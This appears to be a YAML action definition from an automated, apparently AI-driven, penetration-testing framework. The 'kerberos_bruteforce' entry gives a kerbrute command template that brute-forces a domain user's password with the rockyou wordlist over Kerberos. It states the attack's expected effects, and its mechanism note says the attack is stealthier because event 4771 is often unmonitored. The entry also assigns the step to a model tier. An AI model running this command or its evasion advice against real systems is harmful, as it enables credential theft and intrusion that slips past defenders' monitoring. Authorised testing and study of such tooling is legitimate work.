name: kerberos_bruteforce
category: services
description: Kerberos brute-force without lockout
preconditions:
- service.port==88
parameters:
  target_ip: from_engagement.target_ip
command_template: kerbrute bruteuser --dc {target_ip} -d {domain} /usr/share/wordlists/rockyou.txt
  {username}
parser: impacket_parser
expected_effects:
- valid_users_found
- has_users
falsifier:
  pattern: error|failed|refused|denied
  timeout: 30
model_tier: haiku
mechanism: Kerberos pre-auth brute-force generates event 4771 (not 4625). Some orgs
  don't monitor 4771. Slower than SMB spray but stealthier.
hacktricks_ref: windows-hardening/stealing-credentials/credentials-mimikatz.md
